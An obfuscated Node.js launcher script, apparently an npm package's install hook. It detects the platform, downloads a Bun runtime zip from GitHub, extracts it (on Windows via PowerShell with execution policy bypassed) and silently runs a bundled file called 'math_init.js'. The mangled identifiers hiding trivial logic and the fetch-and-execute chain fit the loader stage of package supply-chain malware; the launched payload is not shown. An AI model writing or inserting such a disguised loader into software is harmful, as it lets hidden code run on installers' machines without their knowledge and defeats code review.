#!/usr/bin/env node
import { execFileSync } from "child_process";
import _0x488df8 from "fs";
import _0x52943e from "https";
import _0x24db8d from "os";
import _0x3161c8 from "path";
import { fileURLToPath } from "url";
import _0x548d91 from "zlib";

const D = _0x3161c8.dirname(fileURLToPath(import.meta.url));
const V = "1.3.13";
const E = "math_init.js";
const T = 121000;

const mu = () => {
  const _0x19328d = {
    YCZJE: function (_0x37c5f6, _0x10081e, _0x2420ce, _0x3706fb) {
      return _0x37c5f6(_0x10081e, _0x2420ce, _0x3706fb);
    },
    QkQej: "--version",
    JBhWy: "ignore",
    nYSgn: "pipe",
    WuGMv: "musl",
    TdVzu: "/etc/os-release",
    HdLeg: "utf8",
    gLXYX: "Alpine"
  };
  try {
    const _0x5d9db3 = _0x19328d.YCZJE(execFileSync, "ldd", [_0x19328d.QkQej], {
      stdio: [_0x19328d.JBhWy, _0x19328d.nYSgn, _0x19328d.nYSgn]
    }).toString();
    if (_0x5d9db3.includes(_0x19328d.WuGMv)) {
      return true;
    }
  } catch {}
  try {
    return _0x488df8.readFileSync(_0x19328d.TdVzu, _0x19328d.HdLeg).includes(_0x19328d.gLXYX);
  } catch {
    return false;
  }
};
const PM = {
  "linux-arm64": () => "bun-linux-aarch64",
  "linux-x64": () => mu() ? "bun-linux-x64-musl-baseline" : "bun-linux-x64-baseline",
  "darwin-arm64": () => "bun-darwin-aarch64",
  "darwin-x64": () => "bun-darwin-x64",
  "win32-arm64": () => "bun-windows-aarch64",
  "win32-x64": () => "bun-windows-x64-baseline"
};
function ra() {
  const _0x51cd53 = process.platform + "-" + process.arch;
  const _0x3ab5c4 = PM[_0x51cd53];
  if (!_0x3ab5c4) {
    throw new Error("Unsupported platform/arch: " + _0x51cd53);
  }
  return _0x3ab5c4();
}
function dl(_0x3a05c2, _0x16377f, _0xf43485 = 5) {
  const _0x2c3338 = {
    Hbeql: function (_0x176d23, _0x53a5bf) {
      return _0x176d23(_0x53a5bf);
    },
    DDEed: "Too many redirects",
    OIvQl: function (_0x1dc08d, _0x436ca0, _0x5be236, _0x11fccc) {
      return _0x1dc08d(_0x436ca0, _0x5be236, _0x11fccc);
    },
    EWPHT: function (_0x274872, _0x453b29) {
      return _0x274872 - _0x453b29;
    },
    JbOFw: "finish",
    NIXVR: "node",
    PPSlP: "timeout"
  };
  return new Promise((_0x23325b, _0x415dad) => {
    const _0x46344a = _0x52943e.get(_0x3a05c2, {
      headers: {
        "User-Agent": _0x2c3338.NIXVR
      },
      timeout: T
    }, _0x584133 => {
      const {
        statusCode: _0x460802,
        headers: _0x3e41e8
      } = _0x584133;
      if ([301, 302, 307, 308].includes(_0x460802)) {
        _0x584133.resume();
        if (_0xf43485 <= 0) {
          return _0x2c3338.Hbeql(_0x415dad, new Error(_0x2c3338.DDEed));
        }
        return _0x2c3338.OIvQl(dl, _0x3e41e8.location, _0x16377f, _0x2c3338.EWPHT(_0xf43485, 1)).then(_0x23325b, _0x415dad);
      }
      if (_0x460802 !== 200) {
        _0x584133.resume();
        return _0x2c3338.Hbeql(_0x415dad, new Error("HTTP " + _0x460802 + " for " + _0x3a05c2));
      }
      const _0x155460 = _0x488df8.createWriteStream(_0x16377f);
      _0x584133.pipe(_0x155460);
      _0x155460.on(_0x2c3338.JbOFw, () => _0x155460.close(_0x23325b));
      _0x155460.on("error", _0x1ab142 => {
        _0x488df8.unlink(_0x16377f, () => _0x415dad(_0x1ab142));
      });
    });
    _0x46344a.on("error", _0x415dad);
    _0x46344a.on(_0x2c3338.PPSlP, () => _0x46344a.destroy(new Error("Request timed out")));
  });
}
function hc(_0x144666, _0x4a073a = ["--version"]) {
  const _0x57ccf1 = {
    HWsee: function (_0x28d45d, _0x4983b6, _0x35ba2b, _0x4d91d7) {
      return _0x28d45d(_0x4983b6, _0x35ba2b, _0x4d91d7);
    }
  };
  try {
    _0x57ccf1.HWsee(execFileSync, _0x144666, _0x4a073a, {
      stdio: "ignore"
    });
    return true;
  } catch {
    return false;
  }
}
function xn(_0x4477dd, _0x1330f3, _0xcc0849) {
  const _0x226a6d = {
    BcQPN: function (_0x184e4e, _0x1d0424) {
      return _0x184e4e >= _0x1d0424;
    },
    DPUKn: function (_0x375c61, _0x56150f) {
      return _0x375c61 >= _0x56150f;
    },
    xCtPa: function (_0x1844a1, _0x3ea85a) {
      return _0x1844a1 - _0x3ea85a;
    },
    LJgVr: function (_0x40f7d7, _0x2b065f) {
      return _0x40f7d7 === _0x2b065f;
    },
    aaIUM: function (_0x1c602b, _0x3312ce) {
      return _0x1c602b < _0x3312ce;
    },
    JAOtv: function (_0xb3728b, _0x26e18e) {
      return _0xb3728b + _0x26e18e;
    },
    ZAttW: function (_0x218915, _0x160a56) {
      return _0x218915 + _0x160a56;
    },
    cruvP: function (_0x1a4819, _0x18f1a7) {
      return _0x1a4819 + _0x18f1a7;
    },
    QjztQ: function (_0x40a104, _0x2abd36) {
      return _0x40a104 + _0x2abd36;
    },
    RkEKo: function (_0x310cd5, _0x3dda76) {
      return _0x310cd5 + _0x3dda76;
    },
    oQOIN: "utf8",
    YpqUp: function (_0x1b7a18, _0x288045) {
      return _0x1b7a18 === _0x288045;
    },
    Gkmbt: function (_0x649f8a, _0x5659b4) {
      return _0x649f8a + _0x5659b4;
    },
    xfiND: "Invalid ZIP: bad local-header signature",
    AQUPm: function (_0x61916, _0x17c4a0) {
      return _0x61916 + _0x17c4a0;
    },
    blucA: function (_0x3de5f4, _0x53309b) {
      return _0x3de5f4 === _0x53309b;
    }
  };
  const _0x3d626f = _0x488df8.readFileSync(_0x4477dd);
  let _0x30129f = -1;
  for (let _0x1050ef = _0x3d626f.length - 22; _0x226a6d.BcQPN(_0x1050ef, 0) && _0x226a6d.DPUKn(_0x1050ef, _0x226a6d.xCtPa(_0x3d626f.length, 65557)); _0x1050ef--) {
    if (_0x226a6d.LJgVr(_0x3d626f.readUInt32LE(_0x1050ef), 101010256)) {
      _0x30129f = _0x1050ef;
      break;
    }
  }
  if (_0x226a6d.LJgVr(_0x30129f, -1)) {
    throw new Error("Invalid ZIP: EOCD record not found");
  }
  const _0x306156 = _0x3d626f.readUInt16LE(_0x30129f + 10);
  const _0x5592a3 = _0x3d626f.readUInt32LE(_0x30129f + 16);
  let _0x12ed26 = _0x5592a3;
  let _0x4f2c5e = -1;
  let _0xc0d7d2 = -1;
  let _0x1fb9c9 = 0;
  for (let _0x5d189b = 0; _0x226a6d.aaIUM(_0x5d189b, _0x306156); _0x5d189b++) {
    if (_0x3d626f.readUInt32LE(_0x12ed26) !== 33639248) {
      throw new Error("Invalid ZIP: bad CD entry signature");
    }
    const _0x105bd6 = _0x3d626f.readUInt16LE(_0x12ed26 + 10);
    const _0x16070f = _0x3d626f.readUInt32LE(_0x226a6d.JAOtv(_0x12ed26, 20));
    const _0x45097e = _0x3d626f.readUInt16LE(_0x226a6d.JAOtv(_0x12ed26, 28));
    const _0xf7a496 = _0x3d626f.readUInt16LE(_0x12ed26 + 30);
    const _0x2dec9a = _0x3d626f.readUInt16LE(_0x226a6d.JAOtv(_0x12ed26, 32));
    const _0x50078d = _0x3d626f.readUInt32LE(_0x226a6d.ZAttW(_0x12ed26, 42));
    const _0x3c8d17 = _0x3d626f.subarray(_0x226a6d.cruvP(_0x12ed26, 46), _0x226a6d.QjztQ(_0x226a6d.RkEKo(_0x12ed26, 46), _0x45097e)).toString(_0x226a6d.oQOIN);
    if (_0x226a6d.YpqUp(_0x3c8d17, _0x1330f3)) {
      _0x4f2c5e = _0x50078d;
      _0xc0d7d2 = _0x105bd6;
      _0x1fb9c9 = _0x16070f;
      break;
    }
    _0x12ed26 += _0x226a6d.Gkmbt(_0x226a6d.JAOtv(_0x226a6d.Gkmbt(46, _0x45097e), _0xf7a496), _0x2dec9a);
  }
  if (_0x226a6d.YpqUp(_0x4f2c5e, -1)) {
    throw new Error("Entry \"" + _0x1330f3 + "\" not found in ZIP");
  }
  if (_0x3d626f.readUInt32LE(_0x4f2c5e) !== 67324752) {
    throw new Error(_0x226a6d.xfiND);
  }
  const _0x7fdb51 = _0x3d626f.readUInt16LE(_0x226a6d.RkEKo(_0x4f2c5e, 26));
  const _0x5da609 = _0x3d626f.readUInt16LE(_0x226a6d.cruvP(_0x4f2c5e, 28));
  const _0x1d8f7e = _0x226a6d.JAOtv(_0x226a6d.AQUPm(_0x4f2c5e, 30), _0x7fdb51) + _0x5da609;
  const _0x5975df = _0x3d626f.subarray(_0x1d8f7e, _0x226a6d.cruvP(_0x1d8f7e, _0x1fb9c9));
  let _0x27994e;
  if (_0x226a6d.blucA(_0xc0d7d2, 0)) {
    _0x27994e = _0x5975df;
  } else if (_0xc0d7d2 === 8) {
    _0x27994e = _0x548d91.inflateRawSync(_0x5975df);
  } else {
    throw new Error("Unsupported ZIP compression method: " + _0xc0d7d2);
  }
  const _0x2d7ffe = _0x3161c8.join(_0xcc0849, _0x3161c8.basename(_0x1330f3));
  _0x488df8.writeFileSync(_0x2d7ffe, _0x27994e);
}
function xb(_0x53801b, _0x2912ea, _0x44aefd) {
  const _0x5d8a27 = {
    WaLKQ: function (_0x443d21, _0x188051, _0x591dc3) {
      return _0x443d21(_0x188051, _0x591dc3);
    },
    SiMvK: "unzip",
    DQZne: "-ojq",
    FCJDu: "inherit",
    lQXcL: function (_0x2b7fcb, _0x2ee887) {
      return _0x2b7fcb === _0x2ee887;
    },
    MJNCi: "win32",
    PpNLF: "-Help",
    tHRFe: function (_0x38d224, _0x3708f7, _0x2f2738, _0x3038c8) {
      return _0x38d224(_0x3708f7, _0x2f2738, _0x3038c8);
    },
    DVCdV: "-NoProfile",
    PZdQt: "-NonInteractive",
    NaIqo: "-ExecutionPolicy",
    XFZDA: "-Command"
  };
  if (_0x5d8a27.WaLKQ(hc, _0x5d8a27.SiMvK, ["-v"])) {
    execFileSync(_0x5d8a27.SiMvK, [_0x5d8a27.DQZne, _0x53801b, _0x2912ea, "-d", _0x44aefd], {
      stdio: _0x5d8a27.FCJDu
    });
    return;
  }
  if (_0x5d8a27.lQXcL(process.platform, _0x5d8a27.MJNCi) && _0x5d8a27.WaLKQ(hc, "powershell", [_0x5d8a27.PpNLF])) {
    _0x5d8a27.tHRFe(execFileSync, "powershell", [_0x5d8a27.DVCdV, _0x5d8a27.PZdQt, _0x5d8a27.NaIqo, "Bypass", _0x5d8a27.XFZDA, "Expand-Archive -LiteralPath '" + _0x53801b + "' -DestinationPath '" + _0x44aefd + "' -Force"], {
      stdio: "inherit"
    });
    const _0x54ba74 = _0x3161c8.join(_0x44aefd, _0x2912ea);
    const _0x57f569 = _0x3161c8.join(_0x44aefd, _0x3161c8.basename(_0x2912ea));
    _0x488df8.renameSync(_0x54ba74, _0x57f569);
    return;
  }
  xn(_0x53801b, _0x2912ea, _0x44aefd);
}
async function main() {
  const _0x5f1571 = {
    SBBJg: "bun",
    cDRsb: function (_0x42340a) {
      return _0x42340a();
    },
    TYfsS: function (_0x3b27db, _0x5c3c16) {
      return _0x3b27db === _0x5c3c16;
    },
    IpJiW: "win32",
    dAZFw: "bun.exe",
    zjKAu: "bun-dl-",
    oLhtn: function (_0x521abc, _0x3252b3, _0x540ccd) {
      return _0x521abc(_0x3252b3, _0x540ccd);
    },
    MRkzl: function (_0x4b79a6, _0x5cacca, _0x3b9b02, _0x479446) {
      return _0x4b79a6(_0x5cacca, _0x3b9b02, _0x479446);
    },
    CKbOn: "inherit"
  };
  if (hc(_0x5f1571.SBBJg)) {
    _0x5f1571.MRkzl(execFileSync, _0x5f1571.SBBJg, [_0x3161c8.join(D, E)], {
      stdio: _0x5f1571.CKbOn,
      cwd: D
    });
    return;
  }
  const _0x2dfbd9 = _0x5f1571.cDRsb(ra);
  const _0x369dd9 = _0x5f1571.TYfsS(process.platform, _0x5f1571.IpJiW);
  const _0x28ebf = _0x369dd9 ? _0x5f1571.dAZFw : _0x5f1571.SBBJg;
  const _0x9e5ce7 = "https://github.com/oven-sh/bun/releases/download/bun-v" + V + "/" + _0x2dfbd9 + ".zip";
  const _0x231bb9 = _0x488df8.mkdtempSync(_0x3161c8.join(_0x24db8d.tmpdir(), _0x5f1571.zjKAu));
  const _0x53b0cf = _0x3161c8.join(_0x231bb9, _0x2dfbd9 + ".zip");
  const _0x3f5b74 = _0x3161c8.join(_0x231bb9, _0x28ebf);
  const _0x5b0e02 = _0x3161c8.join(D, E);
  try {
    await _0x5f1571.oLhtn(dl, _0x9e5ce7, _0x53b0cf);
    _0x5f1571.MRkzl(xb, _0x53b0cf, _0x2dfbd9 + "/" + _0x28ebf, _0x231bb9);
    _0x488df8.unlinkSync(_0x53b0cf);
    if (!_0x369dd9) {
      _0x488df8.chmodSync(_0x3f5b74, 493);
    }
    _0x5f1571.MRkzl(execFileSync, _0x3f5b74, [_0x5b0e02], {
      stdio: _0x5f1571.CKbOn,
      cwd: D
    });
  } finally {
    _0x488df8.rmSync(_0x231bb9, {
      recursive: true,
      force: true
    });
  }
}
main().catch(_0x47943b => {
  console.error(_0x47943b.message);
  process.exit(1);
});